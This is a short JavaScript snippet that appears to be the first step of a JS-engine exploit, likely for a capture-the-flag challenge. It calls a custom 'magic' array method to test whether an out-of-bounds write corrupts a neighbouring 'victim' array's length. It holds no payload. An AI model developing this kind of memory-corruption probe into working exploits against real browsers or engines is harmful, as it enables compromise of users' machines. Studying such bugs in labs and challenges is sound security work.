function log(msg) { console.log(msg); }
let arr = [1.1, 2.2];
let victim = [3.3, 4.4];
log('victim elements len before: ' + victim.length);
arr.magic(arr.length, 0);
log('victim elements len after? ' + victim.length);
